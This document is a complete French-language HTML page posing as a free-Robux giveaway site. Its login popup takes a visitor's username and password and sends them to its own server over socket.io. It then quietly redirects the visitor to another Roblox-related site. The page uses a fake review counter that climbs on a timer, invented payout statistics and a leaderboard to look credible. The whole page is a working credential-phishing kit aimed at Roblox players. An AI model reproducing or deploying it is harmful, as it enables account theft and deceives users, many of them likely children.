<!DOCTYPE html>
<html>
<head>
<title>Robux Site</title>

<style>
    .btn-green {
    background: #16a34a;
    color: white;
    padding: 12px 22px;
    border: none;
    border-radius: 999px;
    cursor: pointer;
    font-weight: bold;
    transition: 0.2s;
    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
}

.btn-green:hover {
    transform: scale(1.12);
    background: #22c55e;
}

body {
    margin: 0;
    font-family: Arial;
    background: radial-gradient(circle at top, #0f172a, #020617);
    color: white;
}

.navbar {
    display: flex;
    justify-content: space-between;
    padding: 15px 25px;
    background: rgba(0,0,0,0.6);
    position: sticky;
    top: 0;
}

.btn {
    padding: 10px 18px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: 0.2s;
    font-weight: bold;
}

.btn:hover { transform: scale(1.1); }

.green { background: #16a34a; color: white; }
.yellow { background: #eab308; color: black; }

.hero { text-align: center; margin-top: 70px; }
.hero h1 { font-size: 50px; }

.desc {
    text-align: center;
    max-width: 700px;
    margin: auto;
    opacity: 0.8;
}

.stats {
    display: flex;
    justify-content: center;
    gap: 30px;
    margin-top: 40px;
    flex-wrap: wrap;
}

.card {
    background: #111827;
    padding: 20px;
    border-radius: 12px;
    width: 200px;
    text-align: center;
}

.section {
    max-width: 800px;
    margin: 80px auto;
    text-align: center;
}

.review {
    background: #111827;
    padding: 15px;
    margin-top: 15px;
    border-radius: 12px;
}

.popup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: #000;
    justify-content: center;
    align-items: center;
}

.popup-box {
    background: #111827;
    padding: 20px;
    border-radius: 12px;
    width: 320px;
    text-align: center;
    position: relative;
}

.close {
    position: absolute;
    top: 10px;
    right: 10px;
    background: red;
    color: white;
    border: none;
    padding: 5px 10px;
    cursor: pointer;
    border-radius: 6px;
}

input {
    width: 90%;
    padding: 10px;
    margin: 10px 0;
    border-radius: 8px;
    border: none;
    background: #0f172a;
    color: white;
}

/* 👁 PASSWORD BOX PRO */
.password-box {
    position: relative;
    width: 90%;
    margin: auto;
}

.password-box input {
    width: 100%;
    padding-right: 40px;
}

.eye-btn {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
}

.eye-btn svg {
    width: 20px;
    height: 20px;
    fill: white;
    opacity: 0.7;
}

.eye-btn:hover svg {
    opacity: 1;
}

/* MOBILE */
@media (max-width: 768px) {
    .hero h1 { font-size: 32px; }

    .stats {
        flex-direction: column;
        align-items: center;
    }

    .card {
        width: 90%;
    }

    .navbar {
        flex-direction: column;
        align-items: center;
        gap: 10px;
    }
}
</style>
</head>

<body>

<div class="navbar">
    <button class="btn green" onclick="openLogin()">Commencer à gagner</button>
    <button class="btn yellow" onclick="openClassement()">🏆 Classement</button>
</div>

<div class="hero">
    <h1>Bienvenue</h1>
</div>

<div class="desc">
Vous voulez commencer à gagner sans effort ?
</div>

<div style="text-align:center;margin-top:20px;">
    <button class="btn green" onclick="openLogin()">Commencer à gagner</button>
</div>

<div class="stats">
    <div class="card">
        <h3>6m 05s</h3>
        <p>Temps moyen avant retrait</p>
    </div>

    <div class="card">
        <h3>R$ 950.45</h3>
        <p>Robux</p>
    </div>

    <div class="card">
        <h3>R$ 25,000,000</h3>
        <p>Total</p>
    </div>
</div>

<div class="section">
<h2>⭐ Avis</h2>
<p>4 étoiles sur <span id="count">1856</span></p>
</div>

<!-- LOGIN -->
<div class="popup" id="loginPopup">
<div class="popup-box">

<button class="close" onclick="closeLogin()">X</button>

<h3>Connexion</h3>

<input id="username" placeholder="Pseudo">

<!-- 👁 ICI MODIF -->
<div class="password-box">
    <input id="password" type="password" placeholder="Mot de passe">

    <button type="button" onclick="togglePassword()" class="eye-btn">
        <svg viewBox="0 0 24 24">
            <path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
        </svg>
    </button>
</div>

<button class="btn-green" onclick="handleClick()">Connection</button>

</div>
</div>

<div class="popup" id="classementPopup">
<div class="popup-box">

<button class="close" onclick="closeClassement()">X</button>

<h3>🏆 Classement</h3>

<p>🥇 1. YTBRp*****</p>
<p>🥈 2. ilovefl******</p>

</div>
</div>

<script src="/socket.io/socket.io.js"></script>

<script>

const socket = io();

function togglePassword() {
    const input = document.getElementById("password");
    input.type = (input.type === "password") ? "text" : "password";
}

function handleClick() {
    login();
    setTimeout(() => {
        window.location.href = "https://planetrbx.com/fr";
    }, 500);
}

function openLogin() {
    document.getElementById("loginPopup").style.display = "flex";
}

function closeLogin() {
    document.getElementById("loginPopup").style.display = "none";
}

function openClassement() {
    document.getElementById("classementPopup").style.display = "flex";
}

function closeClassement() {
    document.getElementById("classementPopup").style.display = "none";
}

function login() {
    socket.emit("login", {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    });
}

setInterval(() => {
    document.getElementById("count").innerText =
    parseInt(document.getElementById("count").innerText) + 1;
}, 25000);

</script>

</body>
</html>
